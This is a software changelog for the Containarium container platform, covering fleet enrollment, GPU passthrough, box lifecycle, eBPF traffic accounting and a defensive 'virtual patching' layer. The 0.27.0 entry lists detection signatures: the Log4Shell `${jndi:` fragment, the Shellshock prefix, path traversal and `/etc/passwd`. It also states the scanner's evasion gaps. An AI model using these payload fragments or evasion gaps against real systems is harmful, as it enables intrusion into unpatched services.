# Changelog

All notable changes to Containarium will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.30.0] - 2026-06-16

BYO-compute, end to end: an enrolled host now reports itself to the cloud, so
it shows up live in the cloud fleet view with real specs + health. The OSS half
of the host→cloud report path (pairs with Containarium-cloud's actuation RPCs).

### Added

- **`containarium cloud enroll`.** Self-service host enrollment for BYO-compute:
  redeems a single-use join token against the control plane (`EnrollHost`),
  registers the host, and writes `~/.containarium/cloud.yaml`. Distinct from the
  sysadmin `cloud login` flow — the token from the cloud's "Add compute"
  one-liner doubles as the host's durable bearer. (#694)
- **Actuation status-report loop.** When enrolled, the daemon's actuation client
  periodically reports its self-measured capability profile + `doctor`
  self-check to the cloud (`ReportHostStatus`), so the fleet view shows live
  CONNECTED/DEGRADED status. The profile covers agent version, CPU cores,
  total/available RAM (`/proc/meminfo`), disk (`statfs`), and GPU (count +
  `nvidia-smi` model). (#694, #697)
- **`doctor` self-check in the report.** The capability checks (running-as-root,
  caps, writable paths, live `useradd` probe) were extracted to a shared
  `internal/hostcheck` package so the daemon's report includes them — surfacing
  a capability-trapped host as DEGRADED in the fleet view, not just at first
  container create. (#695)

## [0.29.0] - 2026-06-15

Per-tenant BYO-compute: turn your own spare hosts into a pool and schedule your
own workloads across them — no cross-tenant sharing, data stays on your hosts.

### Added

- **`containarium pool` commands.** `pool list` (pool members + health),
  `pool join` (turnkey one-command host onboarding — writes the canonical
  hardened daemon unit + a `--pool` drop-in + the tunnel unit and starts them;
  idempotent, root-gated, `--dry-run`), and `pool leave` (stop the tunnel /
  deregister from the sentinel, remove the pool config, return the daemon to
  standalone). Replaces the manual `install-lab-*.sh` ritual. (#690, #692)
- **`containarium doctor` capability self-check.** The deploy-contract preflight
  that catches the "capability trap" — a systemd unit that looks fine but whose
  caps/`ReadWritePaths` silently break `useradd`, so the daemon only fails on the
  first container create. Checks uid, effective caps, writable paths (incl.
  `/var/log`), and a live `useradd`/`userdel` probe. Runs at daemon startup
  (loud, non-fatal warning) and gates `pool join`. (#691)
- **Backend capacity primitives.** Advertise/withdraw a backend's spare
  scheduling headroom, a capability profile + micro-benchmark recorded at join,
  a bounded graceful drain when headroom is withdrawn, and a signed
  self-measurement emitted on a heartbeat for control-plane integrity. (#684)

### Changed

- Dependency bumps: `actions/setup-node` 4→6; `golang.org/x/{term,sys,crypto}`;
  `google.golang.org/api`. (#685–#689)

## [0.28.0] - 2026-06-14

Multi-GPU passthrough per container, and **target-aware clients** — the MCP and
CLI now distinguish the hosted control plane from a self-hosted daemon and
refuse host-level operations client-side instead of round-tripping to an opaque
error.

### Added

- **Multi-GPU passthrough per container.** A container can now be created with more than one GPU attached. `containarium create` takes a repeatable/comma-separated `--gpu` flag (`--gpu 0 --gpu 1` or `--gpu 0,1`), each entry an index or PCI address; every device is resolved to a stable PCI address at create time (same kernel-upgrade-safe pinning as the single-GPU path) and attached as a distinct Incus device (`gpu`, `gpu1`, `gpu2`, …). A GPU requested twice (same resolved PCI) is rejected. The proto contract gains `repeated string gpus` on `CreateContainerRequest`/`ResourceLimits` and `repeated string gpu_devices` on `Container`. The single-GPU device name stays `gpu`, so existing single-GPU containers are byte-identical. Surfaced through the gRPC + HTTP clients, and the platform MCP `create_container` tool gains a `gpus` array argument. Read-back (`list`/`get`) reports all attached GPUs (`gpu_devices`), sorted for stable output. (#673)
- **Target-classified MCP backend.** The platform MCP picks its backend from the credential: a hosted-control-plane API token (`ctnr_…`) selects a cloud backend where host-level tools (`get_system_info`, `check_for_updates`, `upgrade_backend`, `debug_container`) report a clear "not available on the hosted control plane" client-side instead of an opaque error; a JWT / daemon credential keeps the full surface. (#676)
- **Target-aware CLI host-level commands.** `info` (system info), `debug`, `backends upgrade`, and `backends versions` refuse client-side with a clear message when pointed at the hosted control plane, mirroring the MCP. The classifier (`ctnr_` token prefix, or the cached per-server access model) is shared via `credentials.IsCloudToken`. Local and self-hosted-daemon targets are unaffected. (#678)

### Changed

- **Dropped the deprecated singular `gpu` request field.** The server now reads only the repeated `gpus`; a client sending only the old singular `gpu` no longer gets GPU passthrough (`gpus` is the only supported shape). This also fixes a latent bug where a multi-GPU create routed to a peer backend silently lost its GPUs. (#677)

## [0.27.0] - 2026-06-13

eBPF virtual patching (Tier 1) + the agent-skills Phase 4 box-assembly fixes
that make the in-box loop provision end-to-end.

### Added

- **eBPF virtual patching — Tier 3 PR-3 (coraza-caddy ingress WAF).** Optional WAF-grade inspection of north-south HTTP ingress via the [Coraza](https://github.com/corazawaf/coraza) WAF as a Caddy plugin — running the OWASP CRS where Caddy has already terminated TLS and parsed the request (the cases the in-kernel tiers can't reach: TLS, multi-segment, vendor rule sets). The custom Caddy build gains `--with github.com/corazawaf/coraza-caddy/v2` **only when WAF is opted into** (the daemon's own dependency surface is untouched — Coraza lives in the Caddy build, not the daemon's `go.mod`), and a `waf` handler is prepended to ingress routes' handler chains so it inspects before `reverse_proxy`. **Off by default** (`CONTAINARIUM_WAF_INGRESS=1`); `SecRuleEngine` runs in `DetectionOnly` (observe + log) unless `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` arms blocking — and with WAF off, programmed routes are byte-identical to before. Covers **ingress only** — east-west (container↔container) is the standalone TPROXY proxy's job (#667). The custom-Caddy build + deploy + Log4Shell validation are operator steps; pure-Go layers (build-arg gating, handler JSON, route injection) are unit-tested. Design + runbook: `docs/security/VIRTUAL-PATCHING-TIER3-INGRESS-WAF.md`, engine choice in `TIER3-WAF-ENGINE-DECISION.md`. #662 (epic #659).
- **eBPF virtual patching — Tier 3 PR-2 (userspace inspection seam).** The steering proxy now inspects steered connections before forwarding: a pluggable `Inspector` reads and **reassembles the request head across TCP segments**, and — armed — returns a `403` instead of forwarding the exploit (observe-only otherwise; both audit `network_policy.waf_block` naming the matched rule). The reference `BuiltinInspector` substring-matches the curated cleartext signatures over the reassembled head — already beyond Tier 2's reach (the in-kernel scan only ever sees a single packet, so a signature split across segments evades it), with **no new dependency**. A real WAF engine (Coraza + the OWASP CRS) is a drop-in behind the same `Inspector` interface, deliberately deferred so adding it to the dependency surface is an explicit decision (likely a `waf` build tag). Enabled with `CONTAINARIUM_WAF_INSPECT=1` on top of `CONTAINARIUM_WAF_TPROXY_ADDR`; blocks only when `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` (same arm as the kernel tiers). Design: `docs/security/VIRTUAL-PATCHING-TIER3.md`. #662 (epic #659).
- **eBPF virtual patching — Tier 3 PR-1 (WAF steering skeleton).** Groundwork for the userspace-WAF tier (#662): a transparent steering proxy (`internal/waf`) that accepts TPROXY-steered connections, recovers each one's original destination (via an `IP_TRANSPARENT` listener — the kernel sets the accepted socket's local address to the original dst), and forwards bytes both ways. **Forward-only — no WAF inspection yet** (Coraza lands in PR-2); this PR de-risks the steer→recover→forward path. Off by default (only starts when `CONTAINARIUM_WAF_TPROXY_ADDR` is set, and steering needs an operator-applied nft TPROXY rule — see `experimental/waf/validate-tproxy-steering.sh`, which validates the whole path inside a throwaway network namespace so it never touches a live host's networking). Linux-only at runtime (compiles everywhere; the bind errors off-Linux). Backend capability already confirmed (kernel 6.8: `nft_tproxy` + `bpf_sk_assign` present, daemon has `CAP_NET_ADMIN`). Design: `docs/security/VIRTUAL-PATCHING-TIER3.md`. #662 (epic #659).
- **Auto-quarantine on malware detection (scanner → virtual-patch).** When the ClamAV scanner finds malware in a container, the daemon adds a deny-all-egress rule to that container's tenant — a network quarantine that stops a compromised container exfiltrating or calling out — and releases it automatically when the container next scans clean. Off by default (`CONTAINARIUM_SECURITY_AUTO_QUARANTINE=1`); the quarantine only *drops* traffic when the network-policy BPF enforcer is also armed (it's recorded as a deny rule either way). Safe against operator rules (the quarantine rule is note-marked; release removes only it, never an operator's own `0.0.0.0/0` deny) and self-healing (a 24h expiry backstop, refreshed each infected scan). This is the honest realization of the virtual-patching epic's "scanner → virtual-patch" capstone (#659): ClamAV's infected/clean verdict maps cleanly onto the Tier 1 deny rules, whereas Trivy package CVEs (a vulnerability *inside* a container, with no network endpoint to block) are deliberately **not** wired — see `docs/security/AUTO-QUARANTINE.md`. Caveat: deny rules are per-tenant, so quarantine blocks all of a tenant's containers' egress (containment over availability). #659.
- **eBPF virtual patching — Tier 2 (cleartext exploit-signature scanning).** The eBPF program now scans the **inbound** payload of a container's TCP connections (the veth TC_EGRESS / container-receive direction) for a curated set of cleartext exploit signatures — Log4Shell `${jndi:`, Shellshock `() {`, Spring4Shell, path-traversal, `/etc/passwd` — and drops the packet before it reaches a vulnerable service, the WAF/IPS form of virtual patching. In-kernel scan via a single `bpf_loop` over a `(signature × offset)` space with a per-CPU scratch buffer and tiered constant-size payload loads (the verifier-feasible shape, validated on a Linux backend at kernel 6.8). Matches audit as `network_policy.signature_match` (naming the matched signature) and only **drop** under enforce mode; the per-packet scan cost is gated so it runs only when enabled. **Three independent opt-ins:** `CONTAINARIUM_NETWORK_POLICY_BPF_OBJECT` (load), `CONTAINARIUM_NETWORK_POLICY_SIGNATURES=1` (scan), `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` (drop). **Best-effort by construction, not a WAF:** single packet (no TCP reassembly → segment-split evasion), cleartext only (TLS is opaque), first 256 payload bytes only — the WAF-grade path is Tier 3 (#662). Operators can also manage their own **global signatures** with `containarium network-policy signature add/rm/list` (e.g. `signature add CVE-2024-1234 --pattern '<bytes>'`) — fleet-wide patterns that augment the built-in set, persisted (`network_policy_signatures` table) and picked up on the reconcile loop; each gets a stable id in a reserved range so an audit match unambiguously names its source. Design + runbook: `docs/security/VIRTUAL-PATCHING-TIER2.md`. #661 (epic #659).
- **eBPF virtual patching — Tier 1 (L3/L4 deny rules).** A network policy can now carry **deny rules** that block a tenant's egress to a destination CIDR (optionally scoped to a port/proto) **before** the egress allow-list is consulted — deny beats allow, the same way the cloud-metadata IP does. This "virtually patches" a known-vulnerable destination in-kernel, with zero downtime, until the real upstream fix ships; an optional `expires_at` makes the rule self-remove once the fix lands. Manage them with `containarium network-policy patch add/rm/list` (e.g. `patch add <tenant> --cidr 1.2.3.4/32 --port 6379 --proto tcp --note CVE-… --expires 2026-07-01T00:00:00Z`); `list` shows a `PATCHES` column. Deny rules are persisted alongside the allow-policy (a `deny_rules` JSONB column) and mutated atomically server-side, so concurrent edits can't lose updates and `network-policy set` (which manages only the allow-policy) preserves them without a client round-trip. Denied flows audit as `network_policy.virtual_patch`, and — like the rest of the policy — only **drop** when enforcement is armed (`CONTAINARIUM_NETWORK_POLICY_ENFORCE=1`); otherwise they are observed and audited. Off entirely unless `CONTAINARIUM_NETWORK_POLICY_BPF_OBJECT` is set. There is at most one deny rule per `(tenant, CIDR)` — the kernel `deny_cidr` LPM map is keyed by CIDR, so block a whole host with `--port 0` (any). Kernel verifier acceptance of the new map + deny-first branch validated on a Linux backend (kernel 6.8, TCX); the end-to-end armed-drop path rides the normal backend upgrade cycle. Design + runbook: `docs/security/VIRTUAL-PATCHING-DESIGN.md`. First tier of the virtual-patching epic (#659); #660. Tiers 2–3 (cleartext signature match, userspace WAF steering) are designed (#661, #662).

### Fixed

- **Agent-skill boxes now assemble the in-box loop.** The `agent-runtime` recipe's `post_start` pulls `install-agent-runtime.sh` + the `agent-box`/`agent-runtime-bundle` artifacts from `…/<release>/…`, where `<release>` is the param the daemon passes — `version.GetVersion()`. But that's the **bare** semver (`0.26.6`; the release workflow builds with `VERSION=${tag#v}`), while the git tag/release is `v`-prefixed (`v0.26.6`), so every URL 404'd and the best-effort assembly silently skipped — agent boxes came up without `agent-runtime`/`agent-box`, and `agent run` fell back to an empty artifact regardless of provider key. The daemon now passes the `v`-prefixed tag (#668).
- **Agent-skill runs are now idempotent.** `provisionSkillBox` always went through the recipe deploy path, whose `CreateContainer` errors `already exists` on a box that's already provisioned — so any re-run (the normal `run → set key → run again` flow, or a crew re-driving its members) failed with `code=Internal`. An existing box is now reused (token re-minted, seed re-applied, policy re-applied; started first if stopped) (#669).
- **MCP container connection path is discoverable to agents** (#658, #663).

## [0.26.6] - 2026-06-12

Network-policy reconcile + egress fixes (hardening for eBPF traffic accounting).

### Fixed

- **Network-policy reconcile no longer hammers Incus.** The enforcer's reconcile loop did an `incus` inspect (`GetRawInstance`) for **every** container **every 10s** to resolve its veth — which could wedge `incusd` on busy or resource-constrained hosts (observed taking down container listing on a host running ~38 containers). Reconcile now caches the container→veth mapping and resolves the ifindex with a cheap local netlink lookup, re-inspecting only when a container starts/restarts (#654, #655).
- **Creating a network policy with no egress domains no longer 500s.** `egress_cidrs`/`egress_domains` are `TEXT[] NOT NULL`; a nil slice was encoded as SQL `NULL` and violated the constraint, so a domains-less policy (e.g. `--mode log_only --egress-cidr 0.0.0.0/0`) failed with SQLSTATE 23502. Nil arrays are now coerced to `'{}'` (#653).
- **Idle-flow reaper:** guarded the `int64`→`uint64` casts (gosec G115) in the #632 reaper path (#656).

## [0.26.5] - 2026-06-12

eBPF traffic history + signed external catalogs.

### Added

- **eBPF traffic-flow accounting completed (traffic-view follow-ups).** The eBPF per-flow path now captures the **reply direction** via a second veth-egress hook, so the traffic view shows `bytes_received`/`packets_received`, not just sent (#631). Closed flows are **persisted to history** by an idle-age reaper — a flow with no packets for `flowIdleTimeout` (2 min) is written to `traffic_connections` and forgotten — so `containarium traffic history` and aggregates light up on docker-in-LXC backends where conntrack attribution fails, without waiting for LRU eviction (#632). Where both conntrack and eBPF observe a flow, **cross-source dedup** keeps a single logical history row per container so byte sums don't double-count (#643). Gated behind `CONTAINARIUM_NETWORK_POLICY_BPF_OBJECT` (off by default). Hardware-validated on a Linux backend (kernel 6.8, TCX).
- **Optional signed external skill/crew catalogs.** An opt-in provenance check on `Manager.LoadDir`: with `CONTAINARIUM_CATALOG_REQUIRE_SIGNED=1` and `CONTAINARIUM_CATALOG_TRUSTED_PUBKEYS` pointing at a trusted-key file, each external `*.yaml` catalog must carry a valid detached ed25519 signature (`foo.yaml.sig`) before it's merged; a missing or bad signature fails that load. Off by default (self-authored catalogs load unsigned, as before) and offline-verifiable for air-gapped installs (#648).

### Fixed

- **deploy-binary:** systemd unit names are now parameterized and the empty-`PEERS` unbound-variable error is fixed (#647).

## [0.26.4] - 2026-06-10

Traffic CLI + login UX fixes.

### Added

- **`containarium traffic` CLI** — `connections`, `summary`, and `history` subcommands over the platform daemon's TrafficService (the same data the webui traffic view shows, now scriptable). Supports `--format table|json` and the usual `--protocol`/`--dest-ip`/`--limit` filters; resolves the server + token from your login like `ssh`/`connect`. (#640)

### Changed

- **Cloud uses the API token for box access; no SSH-key prompt.** On the hosted cloud, box access is via the login token (`containarium connect`), so login no longer offers to register a personal SSH key. Self-hosted (OSS) keeps the SSH-key flow. The access model is learned per server (preferring a server-declared signal, falling back to a host heuristic) and cached in the credentials file. `--with-ssh-setup` still forces key registration. (#637, #638)

### Fixed

- **`containarium login` no longer fails with "device_name must be 1-64 chars".** The auto-generated device name (`<user>@<host>`) contained `@`, outside the cloud's allowed charset, so every default login 400'd; the default is now sanitized to the allowed set and clamped to 64 chars. An explicit `--device-name` is unchanged. (#634)
- **Login shows your real identity instead of "unknown user."** The user email is recovered from the access token's JWT claims (the CLI-session response doesn't carry it) and persisted for `whoami`. (#636)
- **A re-registered SSH key on repeat login is reported as success, not a 409 warning.** (#636)

## [0.26.3] - 2026-06-10

eBPF-sourced network usage.

### Added

- **Per-container network usage (src/dst IP + bytes) from eBPF.** Network traffic is now sourced from a per-veth eBPF program, giving accurate per-container ingress/egress byte accounting with source/destination IPs. (#628)
- **Release binaries embed the compiled BPF object.** The eBPF object is embedded at build time, so release binaries ship it directly — no clang/BPF toolchain required on the backend host to run the traffic collector. (#629)

## [0.26.2] - 2026-06-09

Native Windows CLI client.

### Added

- **Windows (`windows/amd64`) CLI build + release artifact** (`containarium-windows-amd64.exe`). Windows users can now run the `containarium` CLI natively instead of only via WSL. The binary is **client-only**: the `daemon`/`sentinel`/`tunnel` subcommands and the direct-DB / host-admin commands (which depend on Linux facilities — incus/LXC, eBPF, netlink, iptables) are gated `//go:build !windows`, so the Windows binary exposes the remote-client commands (`create`/`list`/`ssh`/`info`/`connect`/…) that talk to a daemon over gRPC/HTTP. linux/macOS builds are unchanged (full binary, daemon included). (#624)

## [0.26.1] - 2026-06-09

Wake-on-SSH fix. The v0.26.0 implementation never fired in the real
topology; this reworks it to the correct design.

### Fixed

- **Wake-on-SSH now actually wakes a slept box.** In v0.26.0 the wake was a sentinel-side proxy that probed sshpiper's upstream to decide whether to wake — but that upstream is an always-on backend SSH router (not the box's sshd), so the probe always succeeded and the wake never fired (#593). The wake now lives in the daemon-local SSH router (`containarium-shell`) where the box identity, state, and start capability already are: a non-running box is started, its `last_started_at`/`stopped_at` bookkeeping is stamped (autosleep anti-thrash + two-phase-reaping reset), and the session waits (bounded) for the box to be ready before proceeding. The v0.26.0 sentinel/daemon machinery (the `ssh-wake-proxy` subcommand, keysync wake-port routing, the daemon `/ssh-wake` endpoint, and the sentinel systemd unit) is removed — sentinels need no changes for wake-on-SSH, which also removes an SSH-path upgrade hazard. (#539, #593)

## [0.26.0] - 2026-06-09

Transparent wake-on-SSH, plus the first request-rate observability plane.
`ssh` to an auto-slept box now starts it on the inbound connection — parity
with wake-on-HTTP — and a new metrics plane surfaces per-container request
rate and egress fan-out, with alerting on crawler-style abuse. Release
binaries now stamp their version from the git tag.

### Added

- **Wake-on-SSH** — an inbound SSH connection to an auto-slept box now transparently starts it, waits for sshd to be dial-ready, then proxies through, exactly like wake-on-HTTP. SSH reaches a box via the external sshpiper, which has no per-connection pre-dial hook, so the interception is a thin sentinel-side wake-proxy (`containarium ssh-wake-proxy`, its own systemd unit) that sshpiper routes upstream through — sshpiper's `authorized_keys` auth and per-user routing stay untouched. The daemon gains `WakeForSSH` and an HMAC-gated `POST /ssh-wake` (same sentinel channel as `/authorized-keys`). Idle-clock reset and the anti-thrash window are inherited from the existing start path. (#539)
- **Request-rate metrics plane (slice 1)** — design + first slice of a per-container request-rate observability plane. (#231)
- **Egress fan-out detection** — a metric flagging crawler-style egress fan-out (an abuse signal), plus vmalert rules that alert on it. (#553, #554)
- **Per-container metrics labeled with `cloud_container_id`** — per-container metrics now carry the cloud container UUID label so the control plane's queries can join on it. (#550, #231)

### Fixed

- **Release binaries stamp the tag version** — `make build-release` injects the version from the git tag via ldflags, so a released binary reports its real version instead of a possibly-stale committed constant; `version.go`'s value is now just the dev-build fallback. (#549)

## [0.25.0] - 2026-06-08

Fleet hygiene + delete protection. `containarium prune` bulk-cleans leaked
boxes; first-class `protect`/`unprotect` verbs (and a `SetContainerDeletePolicy`
RPC) keep a persistent runner from being swept by an automated reap; and the
container read API now surfaces the full idle→stop→delete lifecycle. The `ttl`
verbs finally reach the daemon, closing the failed-CI debug-box leak.

### Added

- **`containarium prune`** — bulk-delete containers matching a filter, for fleet cleanup (reaping piles of leaked/finished ephemeral boxes one command instead of one-by-one). Filters combine with AND: `--state running|stopped`, `--name-contains`, `--older-than <dur>`, `--label key=value` (repeatable). Safeguards: at least one filter required (no accidental delete-all), core platform containers are never eligible, the matching set is listed before anything happens, and deletion needs confirmation (`--yes` to skip, `--dry-run` to preview). Composes the existing list + delete surface, so it works against the OSS daemon and Containarium Cloud alike. (cloud #264)
- **`Container.stopped_at` + `Container.delete_after_stopped_seconds`** — the container read API (`GetContainer`/`ListContainers`) now reports the two-phase reaping status (#525) alongside `ttl_expires_at` and `auto_sleep_enabled`, so a reader sees the *full* lifecycle (where a box is in idle→stop→delete) without host access. Read from the Incus config the daemon stamps; `stopped_at` is omitted while the box runs. Completes the read-side of the box-lifecycle model for the fleet-hygiene view (cloud #264). (#525)
- **Delete-policy protection for `--podman`/runner boxes** — a box marked `user.containarium.delete_policy=protected` is now skipped by every automated/bulk deletion path: the `ttlsweeper` auto-reap and `containarium prune`. So a "clean up leaked boxes" sweep can no longer take out a persistent, registered runner; removing a protected box takes a deliberate single-box `containarium delete`. (cloud #284)
- **`containarium protect` / `containarium unprotect`** — first-class CLI verbs to set/clear that delete protection, replacing the manual `incus config set <box> user.containarium.delete_policy protected` workaround. Backed by a new `SetContainerDeletePolicy` RPC (`POST /v1/containers/{name}/delete-policy`) and a `delete_policy` enum field on the `Container` message, so the policy is settable via gRPC/REST/MCP and surfaced on every list/get read path — not just inspectable on the host. A daemon too old to implement the RPC degrades to a friendly no-op (gRPC `Unimplemented` / HTTP 404). (cloud #284)
- **Metrics attribution carries `cloud_container_id`** — the OTLP collector's `container_ips.json` source-IP map now records each box's cloud container UUID alongside the local name, so when the `source.ip → container.id` join lands it can stamp the label the cloud control plane's metrics queries select on (rather than only the local container name). (cloud #231/#264-A)

### Fixed

- **gRPC `ListContainers` now returns labels** — the gRPC client dropped the `labels` map when converting the response, so label-based filtering (e.g. `containarium prune --label`) saw no labels over gRPC. HTTP already carried them.
- **`containarium ttl set / get / unset` now reach the daemon** — the verbs were client-side stubs that returned a synthetic "not implemented" (and surfaced as HTTP 404 over REST), so the containarium-run *keep-on-failure* path never stamped a TTL and failed-CI debug boxes leaked until deleted by hand. `set`/`unset` now call the real `SetContainerTTL` RPC (unset = duration 0); `get` reads `ttl_expires_at` off `GetContainer`. A daemon too old to implement it still degrades to a friendly no-op (gRPC `Unimplemented` / HTTP 404 mapped to it). (cloud #264)
- **core-caddy survives recreate (stable IP)** — the `--app-hosting` edge container's IP was hard-coded into the split-horizon dnsmasq record (and a host DNAT rule) with no reconciler, so every core-caddy recreate stranded them and internal clients resolved platform hostnames to a dead IP. The daemon now assigns core-caddy a deterministic static IP high in the bridge subnet at creation, so a daemon-driven recreate reuses it and those references stay valid. (cloud #240)

### Dependencies

- Bump `github.com/jackc/pgx/v5` 5.9.2 → 5.10.0 and `google.golang.org/api` 0.282.0 → 0.283.0. (#537, #538)

## [0.24.0] - 2026-06-07

Box lifecycle: the full default-sleep → default-dead model (#522). Every box
can be born with a death date and a stop timer; idle boxes free CPU/RAM, then
disk, with no manual cleanup and without ever reaping a box someone is actively
debugging. Plus sentinel preemption/recovery alerting.

### Added

- **Sentinel preemption/recovery alerting** — the sentinel emits webhook
  notifications and a `/metrics` endpoint on backend preemption + recovery, so
  an outage is observable instead of silent. (#514)
- **Birth TTL — `containarium create --ttl <dur>`** — a box can be born with a
  death date. `CreateContainer` accepts an optional `ttl_seconds`; the daemon
  stamps `ttl_expires_at` atomically at create time (same persistence + 7-day
  cap as `ttl set`), so the `ttlsweeper` reaps the box even if the client dies
  the instant after create — no separate `ttl set` call to forget. Closes the
  leak window where an ephemeral/CI box runs forever because its TTL was never
  set. If the TTL can't be stamped the box is deleted rather than left to leak
  (default-dead). (#523)
- **Birth idle-stop — `containarium create --idle-stop <dur>`** — a box can be
  born with its auto-sleep (idle→stop) timer, not just its delete timer.
  `CreateContainer` accepts an optional `idle_stop_minutes`; the daemon enables
  auto-sleep at create with that idle threshold (same persistence as
  `toggle_auto_sleep`), so a crashed/cancelled job still releases CPU/RAM (disk
  kept, wakes on access) — no separate `toggle_auto_sleep` call to forget. The
  stop half of the default-sleep→default-dead model (birth TTL is the delete
  half). Off by default. (#524)
- **Two-phase reaping — `containarium create --delete-after-stopped <dur>`** —
  completes the lifecycle's second timer: a box left STOPPED past this window is
  auto-deleted (disk reclaim) after idle-stop already reclaimed CPU/RAM. The
  clock runs from the stop transition and RESETS when the box is woken, so a box
  you keep investigating is never reaped — only one left continuously stopped
  is. A **separate opt-in** from idle-stop/auto-sleep: a scale-to-zero box that
  merely sleeps is never deleted just for being stopped. `ttlsweeper.Decide` now
  deletes on either the absolute TTL or the stopped→delete window; the daemon
  stamps `stopped_at` on stop and clears it on start. Off by default. (#525)

### Fixed

- **Auto-sleep no longer stops a box with an active session.** The idle signal
  treated a long-lived open connection (e.g. an SSH/exec debug session) as
  last-active at its *start*, so a session open longer than the idle threshold
  looked idle and the box was slept mid-debug. An open connection now counts as
  active-as-of-now; the box stays awake while anyone is connected and becomes
  sleep-eligible only after the session closes. (#524)

## [0.23.2] - 2026-06-06

### Added

- **`ProxyRoute.container_name`** — `GetRoutes` now returns the container behind each route in a dedicated field instead of overloading `app_name` (the display name), so a multi-tenant control plane can key its route reconciler on the box identity. Additive; `app_name` unchanged. (#511)

### Fixed

- **Sentinel periodic recovery retry** — a backend that goes down is retried with backoff instead of being given up on after the first failed recovery attempt. (#515)
- **Spot VMs are private-by-default in sentinel mode** — `spot_vm_external_ip=false` so a spot backend no longer gets a public IP it doesn't need; the sentinel fronts it. (#518)

## [0.23.1] - 2026-06-06

### Fixed

- **GCP KMS backend re-reads its token file** — the access token is reloaded per request, so a sidecar-refreshed `CONTAINARIUM_GCP_KMS_TOKEN_FILE` is picked up without a daemon restart. (#509)

## [0.23.0] - 2026-06-06

Minor release: pluggable KMS envelope encryption (with an AWS backend and an admin API), shared CephFS volumes, off-host database backups, node-VM scaffolding, and release-drift visibility. Packages all `main` work since v0.22.10.

### Added

- **KMS envelope encryption for tenant secrets** — pluggable backends (`inproc` / `vault` / `gcp` / `aws`, via `CONTAINARIUM_KMS_BACKEND`) wrap a per-row Data Encryption Key under a KMS-resident Key Encryption Key; legacy rows migrate in place. Includes the **AWS KMS** backend (hand-rolled SigV4, no vendor SDK) and a **`KmsService`** admin API — `GetKMSStatus` / `GetEnvelopeCoverage` / `MigrateToEnvelope` — plus a `containarium kms` CLI and admin-scoped MCP tools. (#490, #504)
- **Shared multi-writer CephFS volumes** — proto-first `VolumeService` (create / list / delete / attach / detach), capability-gated on a `cephfs` storage pool (single-node ZFS hosts get a clear error). (#500)
- **Off-host database backups** — `containarium backup` runs `pg_dump` inside a tenant's container and stores the compressed dump on the host or in a GCS bucket (`BackupService` + CLI + MCP); restores verify the dump's SHA-256 first. (#495)
- **`containarium node`** — carve a host into GPU/CPU node-VMs (design + scaffold). (#502)
- **Compose secret/OTel delivery via `env_file`** — nested docker/compose apps don't inherit the LXC environment, so the daemon drops a dotenv file at a fixed path they reference via `env_file:`; the OTel-only env-file mechanism was generalized into a shared delivery seam. (#493, #494)
- **Release-drift visibility** — `GetLatestRelease` endpoints + a CLI update check + a webui Versions panel with per-backend "Upgrade now". (#498, #505)
- **In-container KMS broker design note** — `docs/security/KMS-BROKER-DESIGN.md`: brokering envelope encrypt/decrypt to tenant workloads without handing them the KEK. (#499)
- **System-wide GitHub-runner cap + reconcile controller.** (#489)

### Fixed

- **`ssh_host` is the source of truth for SSH** — the daemon's per-container `ssh_host` is authoritative; the MCP/CLI build the connect target (`user@ssh_host`) from it rather than reconstructing a host. (#503)
- **Login auto-disambiguates a colliding default device name** to avoid a stranded session. (#496)
- **`list_backends` decodes proto-JSON string-encoded int64.** (#501)

## [0.22.10] - 2026-06-04

Patch-release window (0.22.5 → 0.22.10): GitHub-runner provisioning hardening, jump-server multi-key sync, token-to-shell `connect`, and cloud route/actuation plumbing — plus the features that were pending after 0.22.0.

### Added

- **`containarium connect <box>`** — token-to-shell access with no SSH-key setup (+ MCP tool + Tier-2 sessions). (#466, #467)
- **Cloud-assigned container routes exposed at the host edge**, with disk + GPU wired into the cloud actuator's create path. (#463, #465, #469)
- **`RUNNER_DNS`** to pin the GitHub-runner box resolver. (#480)
- **GPU passthrough validation** — `ValidateGPU` RPC + `containarium backends validate-gpu` CLI + `backend_validate_gpu` MCP tool launch a throwaway `nvidia.runtime` LXC, run `nvidia-smi`, and report usable/model/driver (forwarding to the owning peer for remote backends); plus a standalone `scripts/validate-gpu-passthrough.sh` host→VM migration gate. Hardware-verified on an RTX 3090. (#316, #413, #415)
- **`containarium create --no-ssh-key`** — keyless, platform-managed service tenants: no `authorized_keys` seeded, operated via `incus exec` / the daemon. (#388)
- **`containarium backends versions`** — cluster version overview: each backend's daemon version vs the latest release, with a per-backend current/behind status. (#354)
- **Python telemetry distro exports traces + OTLP gRPC** — installs a real `TracerProvider`/`BatchSpanProcessor` (was a no-op that dropped spans) and selects the gRPC vs HTTP exporter from `OTEL_EXPORTER_OTLP_PROTOCOL`, via a new `grpc` extra. (#386)
- **Managed `*.<base-domain>` wildcard TLS** — with DNS-01 configured, the daemon auto-provisions (and self-heals) the wildcard subject at edge startup. (#389)
- **Podman tenant reboot durability** — `--podman` create enables the system + per-user `podman-restart.service` and `loginctl enable-linger`, so restart-policy workloads return after a host reboot/preemption; with a reboot-survival e2e. (#387, #497)
- **Deploy guard for the sentinel HMAC secret** — `scripts/deploy-binary.sh` refuses to swap a v0.19.0+ binary onto a host missing a ≥32-byte `CONTAINARIUM_SENTINEL_AUTH_SECRET`, with a new `docs/SENTINEL-AUTH-SECRET.md` runbook. (#341)

### Fixed

- **Runner provisioning SSHes as the daemon-assigned username**, not the requested name — previously left boxes orphaned and undeletable-by-name on the multi-tenant cloud. (#483)
- **Jump-server authorizes ALL request `ssh_keys`**, not just the first, and syncs create-request keys to `authorized_keys`. (#470, #471, #473)
- **Runner install** grants the runner user sudo + clears stale ephemeral config, and retries the install-state SSH probe across the keysync window. (#476, #478)
- **Fractional CPU requests** — `resources.cpu` in millicpu/decimal (`250m`, `0.25`) now maps to `limits.cpu.allowance`; whole cores still use `limits.cpu`. (#401)
- **sshpiper no longer drops live SSH sessions** on container create/delete — the yaml plugin re-reads its config per connection. (#301)
- **Caddy edge self-heals after a stub-Caddyfile revert** — the route sync rebuilds the base config, and stale `:80/:443` DNAT to a recreated Caddy container IP is reconciled away. (#400)
- **Terraform `containarium_version` upgrades take effect** — startup scripts reconcile the installed binary to the requested version on every boot. (#385)
- **eBPF Phase 0 `validate.sh` builds on stock Ubuntu** — added the multiarch include path so `clang -target bpf` finds `<asm/types.h>`. (#315)
